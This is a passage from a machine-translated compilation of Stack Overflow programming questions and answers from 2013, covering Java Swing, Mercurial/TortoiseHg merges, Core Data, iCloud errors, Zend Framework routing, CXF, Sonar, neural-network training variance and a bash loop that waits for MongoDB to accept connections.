## 回答 #1

> 赞同：0
> 
> 时间：2013-03-31T12:04:42.963

Here are a few thoughts:

1.  See if you can't use immutable objects. This means that whenever a method would modify the object it actually returns a new object with the modified state. The blocks would then go on and use this new object. This is simple, requires no special care but is not always possible.

2.  See if your public methods can't use private methods that carry around state. Since each block would carry around its own internal state then you are also thread safe.

If you had some example use case it might lead to a more ideas...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-22T21:01:24.533

我在使用调度队列进行同步的 C++ 类中非常成功地使用了这样的模式：

```
class Foo
{
public:
    void doSomething() {
        dispatch_sync(fQueue, ^{ doSomething_sync(); });
    }

private:
    void doSomething_sync() { ... }

private:
    dispatch_queue_t fQueue;
}; 
```

这里的一般约定是，对于`_sync`类中的任何给定方法，您只调用其他`_sync`方法而不是它们的非`_sync`公共对应方法。

# java - 使图像显示在 JButton 上

> ID：15443063
> 
> 赞同：0
> 
> 时间：2013-03-15T22:25:52.410
> 
> 标签：java, image, swing, jbutton

我正在尝试制作一个棋盘（8x8 网格）并用背景方块填充它，但它总是显示为一个空方块网格。图像被调用`emptysquare.jpg`，但它确实有背景颜色。

如何正确地将图像添加到`JButton`我拥有的网格上？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T22:34:39.700

您的棋盘为空的原因是您在将按钮添加到面板`JFrame#setVisible` *之前调用了该事实。*`ChessSquare`确保在进行此调用之前已添加所有组件。

也设置`Icon`这样的`ChessSquare`

```
ImageIcon empty = ...
setIcon(empty); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T22:36:59.053

你需要调用`setIcon( empty )`你的构造函数。

在添加方格之前调用是允许但尴尬`setVisible( )`的，但如果你这样做，你可能需要重新打包以使布局正确。

调用`setLayout( )`必须移到循环之前。

# mercurial - 合并中显示的 TortoiseHg 文件

> ID：15443064
> 
> 赞同：4
> 
> 时间：2013-03-15T22:25:53.417
> 
> 标签：mercurial, merge, tortoisehg

我正在编写代码来分析我们对 的提交`Hg`，并将我的结果与`TortoiseHg`. 我无法理解`TortoiseHg`合并情况下的行为。

当我在 中选择合并变更集时`TortoiseHg`，受影响的文件列表仅显示那些有冲突的文件，除非我按下`"Show All"`按钮。至少这似乎是意图，基于我可以从网络上收集到的信息，并且观察到如果我按下“显示全部”按钮，列表中显示的文件有一个双头箭头。

我试图通过将变更集中的每个文件与父母双方进行比较来模拟这一点，并且仅在我的分析中包含与父母双方不同的文件。但是，我遇到了 TortoiseHg 在合并描述中显示的文件，但仅与一个父级不同。我也看到了`TortoiseHg`- 与父母 1 或 2 的差异显示了变化，但另一个父母没有。

我还尝试使用该`--git`选项进行差异化，以确保它不是我缺少的元数据更改，但这根本不会改变结果。

要获取有关我正在使用的变更集的信息：

```
hg log -v -r <rev> --removed --style xml 
```

我拿起合并变更集的父母，对于合并中的每个文件，做

```
hg diff -r <parent1> -r <rev> filename
hg diff -r <parent2> -r <rev< filename 
```

我发现这些文件`TortoiseHg`在我报告的合并摘要中显示为没有冲突的合并。

任何人都可以阐明差异吗？

更新：我能够用 TortoiseHg 本身的源代码重现这一点。

[从https://hg01.codeplex.com/tortoisehg](https://hg01.codeplex.com/tortoisehg)克隆 打开 tortoiseHg 中的 repo 并选择 rev 12602 (58eb7c70)。这是与 12599 (6c716caa) 和 12601 (39c95a81) 的父母的合并。

TortoiseHg 将文件 tortoisehg/hgqt/repowidget.py 显示为合并中唯一的冲突文件，然而

```
hg diff -r 12599 -r 12602 tortoisehg/hgqt/repowidget.py 
```

什么都不返回，而

```
hg diff -r 12601 -r 12602 tortoisehg/hgqt/repowidget.py 
```

显示两行变化。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-17T16:39:27.927

I think I've figured out what tortoisehg's logic is here (though I haven't checked the source to be sure).

As you've guessed, tortoise shows files changed on both sides of a merge with a double arrow. However, it does not look simply at the diff of the merge to each of its parents (e.g. `p1(58eb7c70)::58eb7c70` and `p2(58eb7c70)::58eb7c70`). Instead, tortoise finds all changes introduced in the merge, compared the last common ancestor of the two parents.

Let's take the tortoise repo as an example. The graph view of the ancestry of 58eb7c70 is:

```
Jonathan:tortoisehg $ hg log --graph -r ::58eb7c70 -l 5 --template "{node|short}\n{desc|firstline}\n\n"
o    58eb7c70d501
|\   Merge with stable (noop)
| |
| o  39c95a813105
| |  repowidget: show all errors on infobar
| |
| o  da7ff15b4b96
| |  repowidget: limit infobar error messages to 2 lines of up to 140 chars by default
| |
o |  6c716caa11fd
|\|  Merge with stable
| |
| o  48c055ad634f
| |  sync: show non-ascii command-line arguments correctly
| | 
```

As you can see, merge 58eb7c70d501 merged two branches of development, with one changeset (p1, 6c716caa11fd) on one side, but *two* on the other (p2, 39c95a813105, and its parent, da7ff15b4b96). The point where these branches diverged is the last common ancestor of p1 and p2 -- 48c055ad634f.

(The last common ancestor can be found directly with `hg log -r "last(ancestor(p1(58eb7c70), p2(58eb7c70)))"`)

Let's look at the changes that were made on those two branches. We'll compare each parent of the merge with the common ancestor:

```
Jonathan:tortoisehg $ hg status --rev "48c055ad634f::6c716caa11fd"
M .hgtags
M tortoisehg/hgqt/commit.py
M tortoisehg/hgqt/compress.py
M tortoisehg/hgqt/hgemail.py
M tortoisehg/hgqt/postreview.py
M tortoisehg/hgqt/purge.py
M tortoisehg/hgqt/rename.py
M tortoisehg/hgqt/repowidget.py
M tortoisehg/hgqt/revset.py
M tortoisehg/hgqt/run.py
M tortoisehg/hgqt/settings.py
M tortoisehg/hgqt/status.py
M tortoisehg/hgqt/sync.py
M tortoisehg/hgqt/visdiff.py
M tortoisehg/util/cachethg.py
M tortoisehg/util/hglib.py

Jonathan:tortoisehg $ hg status --rev "48c055ad634f::39c95a813105"
M tortoisehg/hgqt/repowidget.py 
```

These are the changes that were actually merged by 58eb7c70d501 -- everything changed on the two branches since they diverged. As you can see, the only file in common between the lists -- the only file that was changed on both branches -- is `tortoisehg/hgqt/repowidget.py`, just as you expected. You'll see that this file was changed in da7ff15b4b96, the one changeset that's not a parent of the merge but is still included in the changes merged from the two branches.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T17:23:58.887

`tortoisehg/hgqt/repowidget.py`在[6c716caa11fd](https://hg01.codeplex.com/tortoisehg/rev/6c716caa11fd)中进行了修改，这可以解释为什么你的第二次调用`hg diff`给你结果；第一次调用比较两个未注册更改的修订`tortoisehg/hgqt/repowidget.py`；这对我来说似乎是合理的，除非我错过了关于`hg diff`行为方式的其他内容。

# iphone - 托管对象上下文保存和 refreshObject:mergeChanges 有什么区别：

> ID：15443070
> 
> 赞同：4
> 
> 时间：2013-03-15T22:26:36.193
> 
> 标签：iphone, cocoa-touch, core-data, nsmanagedobjectcontext

你好有什么区别

```
 [self.context refreshObject:site mergeChanges:YES]; 
```

和

```
 [self.context save:nil]; 
```

有时我同时使用它们，有时我只使用`save`. 它适用于两种情况。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-15T22:39:34.050

`-save:`保存您对上下文中的任何托管对象所做的更改。这意味着它们被刷新到持久存储协调器，然后将它们写入持久存储，持久存储将它们写入磁盘（假设是磁盘支持的存储）。

另一方面，`-refreshObject:mergeChanges:`做一些完全不同的事情。它从持久存储协调器（从持久存储读取，依此类推）读取对象的当前状态*。*传递意味着保持`YES`对`mergeChanges`对象的任何本地修改完好无损，并且只更新未更改的字段。这与`-save:`.

作为一个简单的思想实验，如果您运行`-save:`然后终止您的应用程序，那么在下次启动时您修改的数据仍然可用。如果您运行`-refreshObject:mergeChanges:`然后终止您的应用程序，您的任何本地更改都将丢失。

# php - jQuery 聊天应用程序垃圾邮件

> ID：15443075
> 
> 赞同：-3
> 
> 时间：2013-03-15T22:27:19.460
> 
> 标签：php, jquery, ajax

我有一个 ajax -> PHP 简单聊天，我想阻止用户发送太多聊天请求或消息太快。什么是限制任何用户可以发送的消息数量以避免垃圾邮件的好方法。我已经对空值和空白消息进行了正常检查。我正在寻找一种方法来防止用户背靠背发送多条消息，例如不断按下发送按钮或按下回车键。我想将此操作限制为每 5 秒 1 条消息，或者如果用户在 5 秒内发送太多问题以强制等待一段时间，然后才能发送另一条消息。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T22:41:07.453

我觉得每分钟的阈值方法比为每条消息设置一个恒定的时间延迟更好。这样会感觉更自然。

如果在客户端用 JS 实现，那么在服务器端也检查速率并在超出速率时返回错误代码是明智的。如果有人试图通过向 AJAX 端点发送请求来利用它，但您也可以实施某种 CSRF 策略来避免这种利用场景。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T22:29:44.763

处理此问题的一种简单方法是在发送新聊天消息后启动计时器，然后禁用聊天消息提交，直到该计时器达到某个数字（例如 5 秒、15 秒、30 秒）。您可以通过禁用“发送”按钮并将其变灰来直观地向用户表明这一点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T22:29:32.270

实施时间延迟：用户在一分钟内不能发布超过 15 次聊天。

# iphone - 在 iCloud 中创建 UIManagedDocument 时出错/崩溃

> ID：15443080
> 
> 赞同：0
> 
> 时间：2013-03-15T22:27:51.163
> 
> 标签：iphone, ios, core-data, icloud, uimanageddocument

在我的项目中，我将 UIManagedDocument 与 CoreData 和 iCloud 一起使用。在 iCloud 中创建 UIManagedDocument 时似乎有很多错误——尤其是在没有网络服务的情况下。

但是现在我在保存文档以进行创建时遇到了一些奇怪的错误/应用程序崩溃与网络服务（也与 wifi）：

```
-[PFUbiquitySetupAssistant validateOptionsWithError:](262): CoreData: Ubiquity:  Error attempting to read ubiquity root url: file://localhost/private/var/mobile/Library/Mobile%20Documents/XXXXXXXXXX~com~companyname~AppName/TransactionsFolder/.
Error: Error Domain=LibrarianErrorDomain Code=1 "The operation couldn’t be completed. (LibrarianErrorDomain error 1 - Unable to initiate item download.)" UserInfo=0x1f56d140 {NSURL=file://localhost/private/var/mobile/Library/Mobile%20Documents/XXXXXXXXXX~com~companyname~AppName/TransactionsFolder/, NSUnderlyingError=0x1d89b4a0 "The operation couldn’t be completed. (UBErrorDomain error 0.)", NSDescription=Unable to initiate item download.}
userInfo: {
NSDescription = "Unable to initiate item download.";
NSURL = "file://localhost/private/var/mobile/Library/Mobile%20Documents/XXXXXXXXXX~com~companyname~AppName/TransactionsFolder/";
NSUnderlyingError = "Error Domain=UBErrorDomain Code=0 \"The operation couldn\U2019t be completed. (UBErrorDomain error 0.)\"";
}

*** Terminating app due to uncaught exception 'NSInternalInconsistencyException', reason: 'This NSPersistentStoreCoordinator has no persistent stores.  It cannot perform a save operation.'
*** First throw call stack: 
```

它表示无法完成从事务日志文件夹的下载操作。我无法理解这一点，因为应用程序应该创建一个文档而不是下载任何内容。

顺便说一句，该应用程序的 iCloud 文件夹是空的！

从设备中删除 iCloud 帐户并再次登录也无济于事。该设备是运行 iOS 6 的 iPhone 4S。

有没有人有过类似的经历？

**编辑：**

现在，经过数百次删除和重建后，我在同一设备上得到了不同的错误：

```
-[PFUbiquitySafeSaveFile waitForFileToUpload:](268): CoreData: Ubiquity: <PFUbiquityPeerReceipt: ...>(0)
permanentLocation: <PFUbiquityLocation: ...>: /private/var/mobile/Library/Mobile Documents/XXXXXXXXXX~com~companyname~AppName/TransactionsFolder/mobile.XXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX/Document/Q0_AoYZV8MTbAihmdWBiEFhxmCgziT9RyrvylTHgQP4=/receipt.0.cdt
safeLocation: <PFUbiquityLocation: ...>: /private/var/mobile/Library/Mobile Documents/XXXXXXXXXX~com~companyname~AppName/TransactionsFolder/mobile.XXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX/Document/Q0_AoYZV8MTbAihmdWBiEFhxmCgziT9RyrvylTHgQP4=/mobile.XXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX.0.cdt
currentLocation: <PFUbiquityLocation: ...>: /private/var/mobile/Library/Mobile Documents/XXXXXXXXXX~com~companyname~AppName/TransactionsFolder/mobile.XXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX/Document/Q0_AoYZV8MTbAihmdWBiEFhxmCgziT9RyrvylTHgQP4=/mobile.XXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX.0.cdt

kv: (null)

Safe save failed for file, error: Error Domain=NSCocoaErrorDomain Code=512 "The file upload timed out." UserInfo=0x1de36dc0 {NSLocalizedDescription=The file upload timed out.}
*** Terminating app due to uncaught exception 'NSInternalInconsistencyException', reason: 'This NSPersistentStoreCoordinator has no persistent stores.  It cannot perform a save operation.'
*** First throw call stack: 
```

不知何故，设备似乎无法访问 iCloud 服务，即使它获得了 iCloud 令牌并且可访问性很好......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T00:05:54.357

是的，我有过*非常*相似的经历。这些是 Core Data 的 iCloud 集成中的内部错误。它们并不意味着您做错了什么，并且您无法在代码中做任何事情来修复它们。你是对的——你没有在你的代码中下载任何东西，但是 Core Data 正在尝试这样做，在幕后，并且失败了。这完全不受您的控制。

第一个错误表明框架无法下载现有的事务文件。可能没有，但也说不出来。第二个错误表示它无法创建任何新的事务文件。你是对的——你无权访问 iCloud，即使 API 说你可以访问。

您**可以**通过在“设置”->“iCloud”中找到您的应用程序并删除那里的所有数据，从设备中删除您的应用程序，牺牲一只鸡，然后再试一次，让事情再次运行。但是问题又回来了。向 Apple 提交错误并希望它得到修复。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-17T18:23:35.487

我知道这很旧，但我一直在寻找类似的问题，也许以下内容会对其他人有所帮助：

在我的情况下，我在删除 iCould 数据和正在开发的应用程序并从头开始重建后得到了这个。设备的完全关闭和重新启动似乎可以解决它 - 不知道为什么，也许 Timbo 的“重置所有设置”会做同样的事情 - 但这样你也不会丢失其他应用程序设置。

阿里

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-12T22:39:23.240

# php - Zend Framework 2 真实世界应用程序文件结构

> ID：15443085
> 
> 赞同：5
> 
> 时间：2013-03-15T22:28:14.220
> 
> 标签：php, zend-framework2

我刚刚开始使用 ZF2，我对 Zend Skeleton Application 感到非常困惑。在当前情况下 URl 看起来像：

```
http://localhost/zf2/public/ 
```

对于名为**Application**的模块，它看起来像：

```
http://localhost/zf2/public/Application/ 
```

并且动作在模块名称之后。我想创建一个带有***管理面板***和***用户面板***的 CMS 。这就是为什么我希望我的用户 URL 像这样：

```
http://localhost/zf2 
```

对于管理员来说：

```
http://localhost/zf2/admin/Module Name/Actions 
```

所以，我的问题是，我应该如何创建这样的 URL？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T22:09:35.313

您的 url 示例看起来像是混淆了公共目录和控制器路由。你通常不应该有这样的网址：

```
http://localhost/zf2/public/ 
```

相反，您通常应该使用虚拟主机。有很多方法可以做到这一点，但如果您想要一个命名的虚拟主机，通常可以归结为自定义端口或自定义主机条目。然后，您的公开网址将类似于以下两个选项之一：

```
http://localhost:9000/ 
```

或者

```
http://myapp.local/ 
```

如果您使用的是 PHP 5.4，那么在您的开发环境中，到目前为止启动主机的最简单方法是使用 PHP 5.4 内置服务器。您可以在项目根目录的命令行上像这样启动它（这使公共目录成为本地主机端口 9000 上临时 Web 服务器的 Web 根目录）：

```
php -S localhost:9000 -t public 
```

整理好 Web 服务器配置后，Skeleton 应用程序将自动解释您的 url 路由（默认情况下），如下所示：

```
http://localhost:9000/some-module/some-controller/some-action 
```

如果您想在 Skeleton 应用程序中的 IndexController 上放置默认 indexAction 的完整文字路径，它看起来像这样：

```
http://localhost:9000/application/index/index 
```

# java - 当我在 CXF @WebMethod 中呈现自己的响应时如何设置内容类型

> ID：15443087
> 
> 赞同：2
> 
> 时间：2013-03-15T22:28:22.850
> 
> 标签：java, cxf, content-type

`Content-Type`当我在 CXF (v2.6.3) 内进行自己的渲染时，我在设置时遇到问题`@WebMethod`。

以下模式工作正常：

```
@Path("/foo")
@WebService
public class FooService {
    @Path("/bar")
    @Produces({ "text/plain" })
    @GET
    @WebMethod
    public String bar() {
        return "hi";
    } 
```

这将返回带有我所期望`"hi"`的标头的 http-client 。`Content-Type: Content-Type: text/plain`

但是，当我尝试使用 response 进行自己的渲染时`OutputStream`，`"hi"`会正确返回，但`@Produces`会忽略注释并返回默认的`text/xml`内容类型。即使我打电话给`setContentType(...)`自己也是如此。

```
@Path("/heartbeat2")
@Produces({ "text/plain" })
@WebMethod
@Get
public void heartbeat2() {
    HttpServletResponse response = messageCtx.getHttpServletResponse();
    response.getOutputStream().write("hi".getBytes());
    // fails with or without this line
    response.setContentType("text/plain");
} 
```

这是输出：

```
HTTP/1.1 200 OK
Content-Type: text/xml
Content-Length: 2
Connection: keep-alive
Server: Jetty(8.1.9.v20130131)

hi 
```

知道如何将自己的输出直接渲染到输出流*并*适当地设置内容类型吗？提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-06-01T16:09:27.440

我看不出你在做什么有什么问题。至少设置内容类型`HttpServletResponse`应该可以工作。无论如何，如果您使用`javax.ws.rs.core.Response`. 看看这是否有效：

```
@Path("/foo")
@WebService
public class FooService {
    @Path("/bar")
    @GET
    @WebMethod
    public Response bar() {
        return Response.ok().type("text/plain").entity("hi").build();
    }
    ... 
```

# wpf - WPF DataGridComboBoxColumn 样式

> ID：15443091
> 
> 赞同：1
> 
> 时间：2013-03-15T22:28:48.853
> 
> 标签：wpf, styles, datagridcomboboxcolumn

我`ComboboxColumn`在`DataGrid`其中使用效果很好。

但是有一个样式问题：
当光标不在列上时，`ComboboxColumn`看起来像`textboxColumn`. 单击它后，右上角会显示一个小箭头，因此它看起来像一个组合框。

我希望它像组合框一样显示，即使它没有被点击或聚焦。我觉得它是`ElementStyle`，但不知道到底要改成什么。有人知道该怎么做吗？

```
xmlns:dg="http://schemas.microsoft.com/wpf/2008/toolkit" 

                    <dg:DataGridComboBoxColumn Width="200" x:Name="column" Header="Column" 
    SelectedValueBinding="{Binding Path=RelParams.ColumnName, UpdateSourceTrigger=PropertyChanged, 
    diagnostics:PresentationTraceSources.TraceLevel= High}"
    DisplayMemberPath="cName"
    SelectedValuePath="cName">

    <dg:DataGridComboBoxColumn.ElementStyle>
        <Style TargetType="ComboBox">
            <Setter Property="ItemsSource" Value="{Binding RelInfo.Columns}" />
        </Style>
    </dg:DataGridComboBoxColumn.ElementStyle>
    <dg:DataGridComboBoxColumn.EditingElementStyle>
        <Style TargetType="ComboBox">
            <Setter Property="ItemsSource" Value="{Binding RelInfo.Columns}" />
        </Style>
    </dg:DataGridComboBoxColumn.EditingElementStyle>

</dg:DataGridComboBoxColumn> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T22:52:58.893

您可以使用`DataGridTemplateColumn`( [msdn](http://msdn.microsoft.com/en-us/library/system.windows.controls.datagridtemplatecolumn.aspx) )。

例子：

```
<dg:DataGridTemplateColumn Header="MyColumn">
    <dg:DataGridTemplateColumn.CellTemplate>
        <DataTemplate>
            <ComboBox ... />
        </DataTemplate>
    </dg:DataGridTemplateColumn.CellTemplate>
</dg:DataGridTemplateColumn> 
```

# java - 使用 Sonar 的 web 服务 java 客户端来持久化属性

> ID：15443096
> 
> 赞同：1
> 
> 时间：2013-03-15T22:29:14.613
> 
> 标签：java, api, plugins, sonarqube

如何[使用 Sonar 的 Web 服务 java 客户端](http://docs.codehaus.org/display/SONAR/Using+the+Web+Service+Java+client)持久化 Sonar 属性？

[编辑：我现在意识到 Web Service Client 不适用于开发插件；而应该使用 Sonar 的 API 中的其他类。请参阅我接受的答案。]

我打算为声纳制作一个插件。与此同时，我正在熟悉 Sonar 的 API，尤其是 Sonar 的 Web 服务 Java 客户端。我试图弄清楚如何保留声纳属性。我写了以下代码：

```
 package testers;

    import org.sonar.wsclient.Sonar;
    import org.sonar.wsclient.services.Property;
    import org.sonar.wsclient.services.PropertyCreateQuery;
    import org.sonar.wsclient.services.PropertyQuery;

    public class PropertyPersister {

        public static Sonar localSonar;
        public static Property sonarStartTime;
        public static PropertyQuery findStartTime;
        public static Property testProperty;
        public static PropertyQuery findTestProperty;
        public static String testKey = "testKey";
        public static String testValue = "testValue";

        /**
         * @param args
         */
        public static void main(String[] args) {

            //localSonar = Sonar.create("http://localhost:9000");//pointed to my instance of Sonar

            //EDIT: using this line instead, but it still gives the same stack trace.
                    localSonar = Sonar.create("http://localhost:9000", "admin", "admin");//pointed to my instance of Sonar

            findStartTime = PropertyQuery.createForKey("sonar.core.startTime");//creating query for a key I know exists
            sonarStartTime = localSonar.find(findStartTime);//retrieve property object from my Sonar's database
            System.out.println(sonarStartTime);//print out this object

            PropertyCreateQuery testCreateQuery = new PropertyCreateQuery(testKey, testValue);//Query to create test property

            localSonar.create(testCreateQuery);//With this line, I'm trying to persist my test property

            findTestProperty = PropertyQuery.createForKey(testKey);//creating query for retrieving test property
            testProperty = localSonar.find(findTestProperty);//line 36: retrieve property object from my Sonar's database
            System.out.println(testProperty);//print test property
        }
    } 
```

此代码打印出已经存在的 sonarStartTime 属性：

```
[sonar.core.startTime:2013-03-14T08:05:42-0700] 
```

然后是倒数第二行抛出的空指针异常。异常消息包括：

```
 org.sonar.wsclient.unmarshallers.UnmarshalException: Can not parse the response of query /api/properties/testKey?: {"err_code":404,"err_msg":"Property not found: testKey"} 
```

使用 MySQL 工作台，我确认确实，我的测试属性从未持久化。显然，我正在以错误的方式解决这个问题。所以，重申我的问题，如何[使用 Sonar 的 Web 服务 java 客户端](http://docs.codehaus.org/display/SONAR/Using+the+Web+Service+Java+client)在 Sonar 中保留一个属性？

[编辑] 这是带有堆栈跟踪的完整控制台输出：

```
[sonar.core.startTime:2013-03-14T08:05:42-0700]
Exception in thread "main" org.sonar.wsclient.unmarshallers.UnmarshalException: Can not parse the response of query /api/properties/testKey?: {"err_code":404,"err_msg":"Property not found: testKey"}

    at org.sonar.wsclient.Sonar.find(Sonar.java:56)
    at testers.PropertyPersister.main(PropertyPersister.java:36)
Caused by: java.lang.ClassCastException: org.json.simple.JSONObject cannot be cast to java.util.ArrayList
    at org.sonar.wsclient.JdkUtils.getArraySize(JdkUtils.java:87)
    at org.sonar.wsclient.unmarshallers.AbstractUnmarshaller.toModel(AbstractUnmarshaller.java:34)
    at org.sonar.wsclient.Sonar.find(Sonar.java:54)
    ... 1 more 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-31T18:28:25.340

[Sonar在此处](http://docs.sonarqube.org/display/SONAR/Coding+a+Plugin)简要解释了如何重用其 API 的现有组件。

您可以简单地在您尝试保留属性的类的构造函数中声明一个 DatabaseSession。例如：

```
import org.sonar.api.database.DatabaseSession;
import org.sonar.api.database.configuration.Property;
import org.sonar.api.resources.Project;
import org.sonar.api.resources.Resource;

public class PropertyPersister{

    private DatabaseSession session;
    private Project project;
    private Property newProperty;

    public PropertyPersister (DatabaseSession session, Project project){
    this.session = session;
    this.project = project; 
    }

    private void persistProperty (Resource resource) {
        int resourceId= resource.getId();       
        newProperty = new Property("sonar.myFabulousProperty", "someValue", resourceId);
        session.save(newProperty);      
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-18T08:14:48.737

如果您希望能够将数据推送到 Sonar，则需要拥有管理员凭据。

所以你应该像这样创建“org.sonar.wsclient.Sonar”实例：

```
localSonar = Sonar.create("http://localhost:9000", "admin", "admin"); 
```

# java - 随机发生器不起作用

> ID：15443101
> 
> 赞同：0
> 
> 时间：2013-03-15T22:30:05.513
> 
> 标签：java

我试图实现一种方法来设置带有 Cell 对象数组的板。然后该方法在“---”字符串上随机放置一个新字符串“C10”。我的班级和主要课程如下

```
public class Cell {
    public int addSpaces;

    public Cell() {
        addSpaces = 0;
    }

    public Cell(int x) {
        addSpaces = x;
    }

    public String toString() {
        String print;
        if (addSpaces == -10)
            print = "C10";
        else
            print = "---";
        return print;
    }
}

import java.util.Random;
public class ChutesAndLadders {
    Cell[] board = new Cell[100]; // Set array of Cell object
    Random ran = new Random();
    Cell s = new Cell();
    public int Chut, Ladd;

    public ChutesAndLadders() {
    }

    public ChutesAndLadders(int numChutes, int numLadders) {
        Chut = numChutes;
        Ladd = numLadders;
    }

    public void setBoard() {
        for (int i = 0; i < board.length; i++)
            board[i] = new Cell(); // board now has 100 Cell with toString "---"
        for (int k = 1; k <= Chut; k++) {
            int RanNum = ran.nextInt(board.length); // Randomly replace the
                                                    // toString
            if (board[RanNum] == board[k])
                this.board[RanNum] = new Cell(-10);
            else
                k--;
        }
    }

    public void printBoard() { // method to print out board
        int count = 0;
        for (int i = 0; i < board.length; i++) {
            count++;
            System.out.print("|" + board[i]);
            if (count == 10) {
                System.out.print("|");
                System.out.println();
                count = 0;
            }
        }
    }

    public static void main(String[] args) {
        ChutesAndLadders cl = new ChutesAndLadders(10, 10);
        cl.setBoard();
        cl.printBoard();
    }
} 
```

我没有在整个板上随机放置 C10，而是得到了这个输出；

```
|---|C10|C10|C10|C10|C10|C10|C10|C10|C10|
|C10|---|---|---|---|---|---|---|---|---|
|---|---|---|---|---|---|---|---|---|---|
|---|---|---|---|---|---|---|---|---|---|
|---|---|---|---|---|---|---|---|---|---|
|---|---|---|---|---|---|---|---|---|---|
|---|---|---|---|---|---|---|---|---|---|
|---|---|---|---|---|---|---|---|---|---|
|---|---|---|---|---|---|---|---|---|---|
|---|---|---|---|---|---|---|---|---|---| 
```

有人可以告诉我我做错了什么吗？谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T22:55:41.463

我不确定你在 for 循环中的意图是什么：

```
if (board[RanNum] == board[k]) 
```

但它会导致你的 for 循环为每个 k 生成随机数，直到它生成 k，然后设置该单元格。因此，对于 k == 1，它将始终设置单元格 1，将单元格 2 设置为 k == 2，将单元格 3 设置为 k == 3，等等。

我猜你想做更多类似的事情：

```
for (int k = 1; k <= Chut; k++) {
    int RanNum = ran.nextInt(board.length);
    if (board[RanNum].addSpaces == 0) // uninitialized
        this.board[RanNum] = new Cell(-10);
    else
        k--;
} 
```

**编辑：**

正如您可能从评论 + 其他答案中意识到的那样，上面的代码不是特别可读。像这样的东西应该更好：

```
int chutCount = 0;
while (chutCount < Chut)
{
    int randomNum = ran.nextInt(board.length);
    if (board[randomNum].addSpaces == 0) // uninitialized
    {
        board[randomNum] = new Cell(-10);
        chutCount++;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T22:55:26.440

我不确定您想要实现什么，但是如果您消除了`if else`内部`setBoard`循环中的 ，那么您应该随机放置`C10`.

改变这个：

```
 for (int k = 1; k <= Chut; k++) {
        int RanNum = ran.nextInt(board.length); // Randomly replace the
                                                // toString
        if (board[RanNum] == board[k])
            this.board[RanNum] = new Cell(-10);
        else
            k--;
    } 
```

对此：

```
 for (int k = 1; k <= Chut; k++) {
        int RanNum = ran.nextInt(board.length); // Randomly replace the
                                                // toString
        this.board[RanNum] = new Cell(-10);
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T22:58:27.793

我想你的意思是`!=`。

```
for (int k = 1; k <= Chut; k++) {
   int ranNum = (int)(Math.random()*board.length);
   if (board[ranNum] != board[k])
      this.board[ranNum] = new Cell(-10);
   else
      k--;
} 
```

# matlab - 相同训练测试集的 ANN 不同结果

> ID：15443102
> 
> 赞同：3
> 
> 时间：2013-03-15T22:30:07.793
> 
> 标签：matlab, neural-network, classification

我正在为 MATLAB 中的监督分类任务实现神经网络。

我有一个训练集和一个测试集来评估结果。问题是，每次我为相同的训练集训练网络时，对于相同的测试集，我会得到非常不同的结果（有时我得到 95% 的分类准确率，有时像 60%）。

现在我知道这是因为我得到了不同的初始权重，并且我知道我可以使用“种子”来设置相同的初始权重，但问题是这对我的数据有什么影响，以及看待这个的正确方法是什么？如何定义使用我设计的 ANN 获得的准确性？是否有针对此的协议（例如运行 ANN 50 次并获得平均准确度之类的）？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-23T19:22:41.767

确保您的测试集与训练集相比足够大（例如，占整体数据的 10%）并检查其多样性。如果您的测试集仅涵盖非常具体的情况，这可能是一个原因。还要确保您始终使用相同的测试集。或者，您应该搜索术语*cross-validation*。

*此外，观察到良好的训练集准确度而观察到较差的测试集准确度是过度拟合*的标志。尝试像简单的 L2 权重衰减一样应用正则化（在每次权重更新后将权重矩阵乘以例如 0.999）。根据您的数据，[Dropout](http://arxiv.org/pdf/1207.0580.pdf)或 L1 正则化也可能有所帮助（特别是如果您的输入数据中有很多冗余）。还要尝试选择更小的网络拓扑（更少的层和/或每层的神经元更少）。

为了加快训练速度，您还可以尝试替代学习算法，例如[RPROP+、RPROP- 或 RMSProp，](https://class.coursera.org/neuralnets-2012-001/lecture/preview)而不是简单的反向传播。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:07:34.857

看起来您的 ANN 没有收敛到最佳权重集。如果没有 ANN 模型的更多细节，我无法确定问题所在，但我会尝试增加迭代次数。

# bash - 如何检查 mongodb 是否已启动并准备好接受来自 bash 脚本的连接？

> ID：15443106
> 
> 赞同：14
> 
> 时间：2013-03-15T22:30:54.330
> 
> 标签：bash, mongodb

我有一个 bash shell 脚本，它在尝试`mongorestore`.

我想确保不仅 MongoDB 已启动，而且在我尝试恢复之前它也已准备好接受连接。

现在，我看到的是，mongo 进程已经启动，但是在它准备好接受连接之前进行初始设置（设置日志文件等）需要 45 秒以上。理想情况下，我想继续循环测试连接，并且只有当我能够连接时，我才想运行`mongorestore`.

有人可以告诉我如何在 Bash 中执行此操作或为我指明正确的方向吗？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2013-03-15T23:53:27.777

要像您建议的那样在循环中测试连接，

```
until nc -z localhost 27017
do
    sleep 1
done 
```

